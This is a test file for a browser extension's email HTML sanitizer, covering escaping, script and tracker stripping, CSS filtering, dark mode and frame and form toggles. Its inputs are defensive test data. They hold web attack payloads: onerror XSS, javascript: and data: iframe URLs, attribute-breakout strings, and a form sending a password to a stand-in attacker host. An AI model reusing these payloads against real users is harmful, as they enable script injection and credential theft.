import { afterAll, describe, expect, mock, test } from 'bun:test';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import {
  DEFAULT_HTML_RENDERING_SETTINGS,
  escapeHtmlText,
  htmlToPlainText,
  initSanitize,
  sanitizeHtml,
  sanitizeStyleBlockCss,
  saveHtmlRenderingSettings,
} from '@/utils/email/sanitize-html.js';
import { PROJECT_ROOT } from '../helpers/project-root.js';

afterAll(() => mock.restore());
const storedSettings: Record<string, unknown> = {};
mock.module('wxt/browser', () => ({
  browser: {
    storage: {
      local: {
        get: async () => ({ ...storedSettings }),
        set: async (values: Record<string, unknown>) => {
          Object.assign(storedSettings, values);
        },
      },
      onChanged: { addListener: () => {} },
    },
  },
}));

describe('escapeHtmlText', () => {
  test('escapes plain text before it is wrapped in HTML containers', () => {
    expect(escapeHtmlText('<img src=x onerror=alert(1)> & "quote"')).toBe(
      '&lt;img src=x onerror=alert(1)&gt; &amp; &quot;quote&quot;'
    );
  });
});

describe('sanitizeHtml', () => {
  test('strips HTML tags when DOMPurify is not yet loaded', () => {
    const raw =
      '<p style="background-image:image-set(\'https://evil.example/track.png\' 1x)">Hello <strong>World</strong></p>' +
      '<style>.x { background: url(https://evil.example/block.png); }</style>' +
      '<script>alert(1)</script>';
    // Since DOMPurify is not loaded, it falls back to tag stripping regex
    const sanitized = sanitizeHtml(raw);
    expect(sanitized).toContain('Hello World');
    // Script/style bodies are removed entirely - they must never leak as text
    expect(sanitized).not.toContain('alert(1)');
    expect(sanitized).not.toContain('<p>');
    expect(sanitized).not.toContain('evil.example');
    expect(sanitized).not.toContain('style=');
  });

  describe('with DOMPurify loaded', () => {
    test('preloads DOMPurify successfully', async () => {
      await initSanitize();
    });

    test('decodes and unblocks Guerrilla Mail proxy image resources', () => {
      const raw =
        '<img src="https://www.guerrillamail.com/res.php?r=1&amp;n=img&amp;q=https%3A%2F%2Fexample.com%2Flogo.png" />';
      const sanitized = sanitizeHtml(raw, { allowImages: true });
      expect(sanitized).toContain('src="https://example.com/logo.png"');

      const rawRawAmp = '<img src="/res.php?r=1&n=img&q=https%3A%2F%2Fexample.org%2Flogo2.png" />';
      const sanitizedRawAmp = sanitizeHtml(rawRawAmp, { allowImages: true });
      expect(sanitizedRawAmp).toContain('src="https://example.org/logo2.png"');
    });

    test('refuses to unblock a proxy URL whose decoded payload breaks out of the attribute', () => {
      // `%22%3E%3Cimg …` decodes to `"><img src=x onerror=…>` - the old
      // unchecked splice closed the src attribute early and injected a second
      // element. The rewrite must be skipped instead.
      const raw =
        '<img src="/res.php?r=1&amp;n=img&amp;q=https%3A%2F%2Fexample.com%2Flogo.png%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" />';
      const sanitized = sanitizeHtml(raw, { allowImages: true });
      expect(sanitized).not.toMatch(/onerror\s*=/i);
      expect((sanitized.match(/<img/gi) || []).length).toBe(1);
    });

    test('refuses to unblock a proxy URL that hides a quote behind an HTML entity', () => {
      // The entity form of the delimiter survives the splice as literal text and
      // is turned back into a raw quote by the entity-decode pass - which runs
      // whenever the message also contains entity-encoded tags (the `&lt;span&gt;`
      // here). It must therefore be rejected up front, exactly like a raw `"`.
      const raw =
        "<p>&lt;span&gt;hi&lt;/span&gt;</p><img src='/res.php?r=1&n=img&q=https%3A%2F%2Fexample.com%2Flogo.png%26quot%3B%3E%3Cimg%20src%3Dx%3E' />";
      const sanitized = sanitizeHtml(raw, { allowImages: true });
      expect((sanitized.match(/<img/gi) || []).length).toBe(1);
      expect(sanitized).not.toMatch(/<img[^>]*src=x/i);
    });

    test('still unblocks proxy URLs that decode to a plain image URL', () => {
      const raw =
        '<img src="/res.php?r=1&amp;n=img&amp;q=https%3A%2F%2Fcdn.example.com%2Fa.png%3Fw%3D10%26h%3D20" />';
      // Query-string `&` is re-escaped by the serializer - same URL, valid markup.
      const sanitized = sanitizeHtml(raw, { allowImages: true });
      expect(sanitized).toContain('src="https://cdn.example.com/a.png?w=10&amp;h=20"');
    });

    test('strips remote images by default (privacy)', () => {
      const raw = '<p>Hi</p><img src="https://example.com/track.png" alt="x" />';
      const sanitized = sanitizeHtml(raw);
      expect(sanitized).not.toContain('<img');
      expect(sanitized).toContain('Hi');
    });

    test('strips remote CSS images from inline styles while preserving safe declarations', () => {
      const raw = [
        '<p style="background-image:image-set(\'https://evil.example/x.png\' 1x); color:red">x</p>',
        '<p style="background-image:url(https://evil.example/y.png); padding:4px">y</p>',
        '<p style="background-image:u\\72 l(\'https://evil.example/z.png\'); margin:2px">z</p>',
      ].join('');

      const sanitized = sanitizeHtml(raw);

      expect(sanitized).not.toContain('evil.example');
      expect(sanitized).toContain('color: red');
      expect(sanitized).toContain('padding: 4px');
      expect(sanitized).toContain('margin: 2px');
    });

    test('strips remote CSS image functions from scoped style blocks', () => {
      const raw = `<style>
        .set { background-image: image-set("https://evil.example/a.png" 1x); color: red; }
        .webkit { background-image: -webkit-image-set("https://evil.example/b.png" 1x); }
        .fade { background-image: cross-fade(url("https://evil.example/c.png"), linear-gradient(red, blue), 50%); }
        .safe { padding: 8px; }
      </style><p>x</p>`;

      const sanitized = sanitizeHtml(raw, { allowStyleBlocks: true });

      expect(sanitized).not.toContain('evil.example');
      expect(sanitized).not.toContain('image-set');
      expect(sanitized).not.toContain('cross-fade');
      expect(sanitized).toContain('.set { color: red; }');
      expect(sanitized).toContain('.safe { padding: 8px; }');
    });

    test('strips legacy remote background attributes', () => {
      const sanitized = sanitizeHtml(
        '<table background="https://evil.example/bg.png"><tr><td>message</td></tr></table>'
      );

      expect(sanitized).not.toContain('background=');
      expect(sanitized).not.toContain('evil.example');
      expect(sanitized).toContain('message');
    });

    test('sanitizes HTML properly after DOMPurify is loaded', () => {
      const raw = '<p>Hello <strong>World</strong><script>alert(1)</script></p>';
      const sanitized = sanitizeHtml(raw);
      expect(sanitized).toContain('<p>Hello <strong>World</strong></p>');
      expect(sanitized).not.toContain('<script>');
    });

    test('decodes entity-encoded tags even when raw HTML is also present (mixed content)', () => {
      // Previously the decode pass was skipped whenever the message contained
      // a raw `<`, so the encoded half rendered as literal text.
      const raw = '<p>Raw</p>&lt;div style="color: red;"&gt;Encoded&lt;/div&gt;';
      const sanitized = sanitizeHtml(raw);
      expect(sanitized).toContain('<p>Raw</p>');
      expect(sanitized).toContain('<div style="color: red;">Encoded</div>');
    });

    test('does not double-decode &amp;lt; into a raw tag', () => {
      const raw = '<p>Escaped: &amp;lt;div&amp;gt; text</p>';
      const sanitized = sanitizeHtml(raw);
      // Single-level decode: `&amp;lt;` becomes literal `&lt;` text, never a tag.
      expect(sanitized).toContain('&amp;lt;div&amp;gt; text');
      expect(sanitized).not.toContain('<div>');
    });

    test('keeps inline style attributes but strips style blocks', () => {
      const raw =
        '<div style="color: red; padding: 10px;">Content</div><style>.btn { background: blue; }</style>';
      const sanitized = sanitizeHtml(raw);
      expect(sanitized).toContain('style="color: red; padding: 10px;"');
      // <style> would inject GLOBAL css into the extension UI - must be removed
      expect(sanitized).not.toContain('<style');
      expect(sanitized).not.toContain('.btn');
    });

    test('keeps sanitized style blocks only when allowStyleBlocks is set (shadow DOM path)', () => {
      const raw =
        '<div>Hello</div><style>@media only screen and (max-width: 480px) { .info-item { display: block !important; } }</style>';
      // Default: stripped
      const stripped = sanitizeHtml(raw);
      expect(stripped).not.toContain('<style');
      expect(stripped).not.toContain('@media');
      // Shadow-DOM path: sanitized block kept
      const kept = sanitizeHtml(raw, { allowStyleBlocks: true });
      expect(kept).toContain('<style>');
      expect(kept).toContain('@media only screen and (max-width:480px)');
      expect(kept).toContain('.info-item { display: block !important; }');
      expect(kept).toContain('Hello');
    });

    test('strips dangerous CSS from allowed style blocks (url, overlay props, imports)', () => {
      const raw =
        '<style>' +
        '@import url("https://evil.example/x.css");' +
        '@font-face { font-family: x; src: url(https://evil.example/f.woff); }' +
        '.overlay { position: fixed; inset: 0; z-index: 99999; transform: scale(1); opacity: 0; }' +
        '.tracker { background-image: url(https://evil.example/pixel.png); }' +
        '.clean { color: #333; padding: 8px; }' +
        '</style>';
      const sanitized = sanitizeHtml(raw, { allowStyleBlocks: true });
      expect(sanitized).not.toContain('@import');
      expect(sanitized).not.toContain('@font-face');
      expect(sanitized).not.toContain('position');
      expect(sanitized).not.toContain('z-index');
      expect(sanitized).not.toContain('transform');
      expect(sanitized).not.toContain('opacity');
      expect(sanitized).not.toContain('url(');
      expect(sanitized).toContain('.clean { color: #333; padding: 8px; }');
      expect(sanitized).not.toContain('.overlay');
      expect(sanitized).not.toContain('.tracker');
    });

    test('strips :host / :root selectors and custom properties from style blocks', () => {
      const raw =
        '<style>:host { display: none; } :root { --x: 1; } .ok { --local: red; color: var(--local); }</style>';
      const sanitized = sanitizeHtml(raw, { allowStyleBlocks: true });
      expect(sanitized).not.toContain(':host');
      expect(sanitized).not.toContain(':root');
      // The --local: red declaration is dropped (custom props could smuggle
      // values); a var() reference in a value is harmless because no --* can
      // ever be defined, so it just resolves to initial.
      expect(sanitized).not.toContain('--local: red');
      expect(sanitized).toContain('.ok { color: var(--local); }');
    });

    test('strips document-level tags that could restyle the app', () => {
      const raw =
        '<html><head><style>body { display: none; }</style><link rel="stylesheet" href="https://evil.example/x.css"></head><body><p>Hi</p></body></html>';
      const sanitized = sanitizeHtml(raw);
      expect(sanitized).not.toContain('<style');
      expect(sanitized).not.toContain('<link');
      expect(sanitized).not.toContain('<html');
      expect(sanitized).not.toContain('<head');
      expect(sanitized).not.toContain('<body');
      expect(sanitized).toContain('Hi');
    });

    test('strips overlay/phishing CSS from inline styles', () => {
      const raw =
        '<div style="color: red; position: fixed; inset: 0; z-index: 99999; width: 100vw; height: 100vh;">Content</div>';
      const sanitized = sanitizeHtml(raw);
      expect(sanitized).not.toContain('position');
      expect(sanitized).not.toContain('z-index');
      expect(sanitized).not.toContain('inset');
      expect(sanitized).toContain('color: red');
      expect(sanitized).toContain('Content');
    });

    test('strips class/id attributes from email content', () => {
      const raw = '<p id="app" class="flex hidden">Content</p>';
      const sanitized = sanitizeHtml(raw);
      expect(sanitized).not.toContain('id=');
      expect(sanitized).not.toContain('class=');
      expect(sanitized).toContain('<p>Content</p>');
    });

    test('forces rel="noopener noreferrer" and target="_blank" on links', () => {
      const raw = '<a href="https://example.com">Link</a>';
      const sanitized = sanitizeHtml(raw);
      expect(sanitized).toContain('rel="noopener noreferrer"');
      expect(sanitized).toContain('target="_blank"');
    });

    describe('dark-mode neutralization', () => {
      test('rewrites light backgrounds to transparent, keeping layout', () => {
        const raw = '<div style="background-color: #ffffff; padding: 12px;">Content</div>';
        const sanitized = sanitizeHtml(raw, { darkMode: true });
        expect(sanitized).toContain('background-color: transparent');
        expect(sanitized).toContain('padding: 12px');
      });

      test('rewrites dark text colors to inherit, keeping other props', () => {
        const raw = '<p style="color: #111111; font-size: 14px;">Content</p>';
        const sanitized = sanitizeHtml(raw, { darkMode: true });
        expect(sanitized).toContain('color: inherit');
        expect(sanitized).toContain('font-size: 14px');
      });

      test('handles rgb() and named colors', () => {
        const raw = '<div style="background: rgb(255, 255, 255); color: black;">Content</div>';
        const sanitized = sanitizeHtml(raw, { darkMode: true });
        expect(sanitized).toContain('background: transparent');
        expect(sanitized).toContain('color: inherit');
      });

      test('keeps mid-tone backgrounds and light text', () => {
        const raw = '<div style="background-color: #2b2b2b; color: #e0e0e0;">Content</div>';
        const sanitized = sanitizeHtml(raw, { darkMode: true });
        expect(sanitized).toContain('#2b2b2b');
        expect(sanitized).toContain('#e0e0e0');
      });

      test('neutralizes bgcolor attribute and dark font color attribute', () => {
        const raw =
          '<table bgcolor="#ffffff"><tr><td bgcolor="#f7f7f7">Hi</td></tr></table><font color="#000000">Text</font>';
        const sanitized = sanitizeHtml(raw, { darkMode: true });
        expect(sanitized).not.toContain('bgcolor');
        expect(sanitized).not.toContain('color="#000000"');
        expect(sanitized).toContain('Hi');
        expect(sanitized).toContain('Text');
      });

      test('rewrites a light leading token in a background shorthand', () => {
        const raw = '<div style="background: #ffffff center no-repeat; width: 100%;">Content</div>';
        const sanitized = sanitizeHtml(raw, { darkMode: true });
        expect(sanitized).toContain('transparent center no-repeat');
        expect(sanitized).toContain('width: 100%');
      });

      test('is disabled by default so light-mode emails keep their colors', () => {
        const raw = '<div style="background-color: #ffffff; color: #111111;">Content</div>';
        const sanitized = sanitizeHtml(raw);
        expect(sanitized).toContain('#ffffff');
        expect(sanitized).toContain('#111111');
      });
    });
  });
});

describe('sanitizeStyleBlockCss', () => {
  test('keeps responsive @media rules with layout declarations', () => {
    const css =
      '@media only screen and (max-width: 480px) { .info-item { display: block !important; } .info-item { border-left: none !important; } }';
    const out = sanitizeStyleBlockCss(css);
    expect(out).toContain('@media only screen and (max-width:480px)');
    expect(out).toContain('display: block !important');
    expect(out).toContain('border-left: none !important');
  });

  test('keeps plain rules and normalizes vendor-prefixed forbidden props', () => {
    const css = '.a { color: red; -webkit-transform: scale(2); -moz-position: fixed; }';
    const out = sanitizeStyleBlockCss(css);
    expect(out).toContain('color: red');
    expect(out).not.toContain('transform');
    expect(out).not.toContain('position');
  });

  test('drops at-rules that load external resources or animate', () => {
    const css =
      '@import url(x.css); @font-face { src: url(f.woff); } @keyframes spin { to { transform: rotate(1turn); } } .ok { color: blue; }';
    const out = sanitizeStyleBlockCss(css);
    expect(out).not.toContain('@import');
    expect(out).not.toContain('@font-face');
    expect(out).not.toContain('@keyframes');
    expect(out).not.toContain('url(');
    expect(out).toContain('color: blue');
  });

  test('keeps @supports feature queries', () => {
    const css = '@supports (display: grid) { .g { display: grid; } }';
    const out = sanitizeStyleBlockCss(css);
    expect(out).toContain('@supports (display:grid)');
    expect(out).toContain('display: grid');
  });

  test('strips comments and empty results return empty string', () => {
    expect(sanitizeStyleBlockCss('/* hidden */ .x { /* inner */ color: red; }')).toContain(
      'color: red'
    );
    expect(sanitizeStyleBlockCss('.x { position: fixed; }')).toBe('');
    expect(sanitizeStyleBlockCss('')).toBe('');
    expect(sanitizeStyleBlockCss('   ')).toBe('');
  });

  test('strips expression() and behavior: scripting vectors', () => {
    const css = '.x { width: expression(alert(1)); behavior: url(evil.htc); } .y { width: 10px; }';
    const out = sanitizeStyleBlockCss(css);
    expect(out).not.toContain('expression');
    expect(out).not.toContain('behavior');
    expect(out).not.toContain('url(');
    expect(out).toContain('.y { width: 10px; }');
  });

  test('neutralizes light backgrounds and dark text when darkMode is set', () => {
    const css = '.box { background-color: #ffffff; color: #111111; padding: 8px; }';
    const light = sanitizeStyleBlockCss(css);
    expect(light).toContain('#ffffff');
    expect(light).toContain('#111111');
    const dark = sanitizeStyleBlockCss(css, { darkMode: true });
    expect(dark).toContain('background-color: transparent');
    expect(dark).toContain('color: inherit');
    expect(dark).toContain('padding: 8px');
  });

  test('darkMode neutralization also applies inside kept @media blocks', () => {
    const css = '@media (max-width: 480px) { .box { background-color: #ffffff; } }';
    const dark = sanitizeStyleBlockCss(css, { darkMode: true });
    expect(dark).toContain('@media (max-width:480px)');
    expect(dark).toContain('background-color: transparent');
    expect(dark).not.toContain('#ffffff');
  });
});

describe('htmlToPlainText', () => {
  test('strips <script> and <style> text so CSS/JS never pollutes extraction', () => {
    const raw =
      '<div><style>.btn { color: red; }</style>Hello <script>alert(1)</script>World</div>';
    const text = htmlToPlainText(raw);
    expect(text).toContain('Hello');
    expect(text).toContain('World');
    expect(text).not.toContain('.btn');
    expect(text).not.toContain('alert');
    expect(text).not.toContain('color');
  });

  test('keeps visible text between style/script blocks', () => {
    const raw = '<style>a{}</style><p>Visible</p><script>x()</script><p>More</p>';
    const text = htmlToPlainText(raw);
    expect(text).toContain('Visible');
    expect(text).toContain('More');
    expect(text).not.toContain('a{}');
    expect(text).not.toContain('x()');
  });
});

describe('style-block HTML breakout protection', () => {
  test('escapes </style> inside CSS strings so the tag cannot close early', () => {
    // `</style foo>` (whitespace after the name) closes a <style> element in
    // the HTML parser but is NOT matched by the block-extraction regex - so
    // without escaping it would land as raw HTML in the shadow root.
    const raw = '<style>.x { content: "</style foo><img src=x onerror=alert(1)>bar"; }</style>';
    const sanitized = sanitizeHtml(raw, { allowStyleBlocks: true });
    // CSS is kept (content is a safe declaration) but `</style` becomes
    // `<\/style` (\/ is a CSS escape for /), so the parser never sees a close.
    expect(sanitized).toContain('<\\/style foo>');
    expect(sanitized).not.toContain('</style foo>');
    // Exactly one real closing tag survives - the one we emit.
    expect((sanitized.match(/<\/style>/gi) || []).length).toBe(1);
  });

  test('escapes case-insensitive </STYLE> variants', () => {
    const raw = '<style>.x { content: "</STYLE foo><b>hi</b>bar"; }</style>';
    const sanitized = sanitizeHtml(raw, { allowStyleBlocks: true });
    // The escape is case-insensitive; the emitted `\/style` marker is lowercase.
    expect(sanitized).toContain('<\\/style foo>');
    expect(sanitized).not.toContain('</STYLE foo>');
    // The markup stays inert CSS string text (inside the style element's raw
    // text) - the real closing tag is emitted exactly once.
    expect(sanitized).toContain('<b>hi</b>');
    expect((sanitized.match(/<\/style>/gi) || []).length).toBe(1);
  });

  test('renders the escaped style block with layout intact', () => {
    const raw = '<style>.hero { padding: 12px; color: #333; }</style>';
    const sanitized = sanitizeHtml(raw, { allowStyleBlocks: true });
    expect(sanitized).toContain('<style>');
    expect(sanitized).toContain('.hero { padding: 12px; color: #333; }');
    expect((sanitized.match(/<\/style>/gi) || []).length).toBe(1);
  });
});

/**
 * The iframe / object / form rendering toggles are user opt-ins that ship OFF.
 * Even switched ON, email content must not be able to reach a remote frame or
 * hand data to an attacker:
 *   • DOMPurify drops `action` / `method` / `formaction` / `name` / `value`,
 *     so a rendered <form> has nowhere to submit and no field names to leak;
 *   • script-bearing frame URLs (`srcdoc`, `data:`, `javascript:`) are dropped;
 *   • a surviving remote https `src` on <iframe>/<embed> is blocked from
 *     LOADING by the extension-page CSP - `frame-src` falls back to
 *     `default-src 'self'` and `object-src 'none'` covers <embed>/<object>.
 * The last test pins that CSP, because it is the layer doing the blocking for
 * remote frames; reaching one therefore requires breaking BOTH layers.
 */
describe('html-rendering toggles cannot reach a remote frame or a submittable form', () => {
  const allTagsOn = { ...DEFAULT_HTML_RENDERING_SETTINGS, iframe: true, object: true, form: true };

  async function withAllTagsOn<T>(run: () => T): Promise<T> {
    await initSanitize();
    await saveHtmlRenderingSettings(allTagsOn);
    try {
      return run();
    } finally {
      await saveHtmlRenderingSettings({ ...DEFAULT_HTML_RENDERING_SETTINGS });
    }
  }

  test('a form from email content keeps no destination and no field names', async () => {
    const raw =
      '<form action="https://evil.example/collect" method="post">' +
      '<input type="password" name="pw" value="secret">' +
      '<button formaction="https://evil.example/steal">Go</button></form>';
    const sanitized = await withAllTagsOn(() => sanitizeHtml(raw));
    expect(sanitized).toContain('<form>');
    expect(sanitized).not.toMatch(/\b(?:action|formaction|method|name|value)\s*=/i);
    expect(sanitized).not.toContain('evil.example');
  });

  test('script-bearing frame URLs are dropped even with iframe rendering on', async () => {
    const raw =
      '<iframe srcdoc="<script>alert(1)</script>"></iframe>' +
      '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>' +
      '<iframe src="javascript:alert(1)"></iframe>';
    const sanitized = await withAllTagsOn(() => sanitizeHtml(raw));
    expect(sanitized).toContain('<iframe>');
    expect(sanitized).not.toContain('srcdoc');
    expect(sanitized).not.toContain('data:text/html');
    expect(sanitized).not.toContain('javascript:');
    expect(sanitized).not.toContain('alert(1)');
  });

  test('the extension-page CSP still blocks remote frame/object loads', () => {
    const config = readFileSync(join(PROJECT_ROOT, 'wxt.config.ts'), 'utf8');
    expect(config).toContain('content_security_policy');
    // frame-src (→ default-src) keeps <iframe src="https://…"> unloadable…
    expect(config).toContain("default-src 'self'");
    // …and object-src covers <embed>/<object>, which no frame-src can reach.
    expect(config).toContain("object-src 'none'");
    expect(config).toContain("script-src 'self'");
  });
});
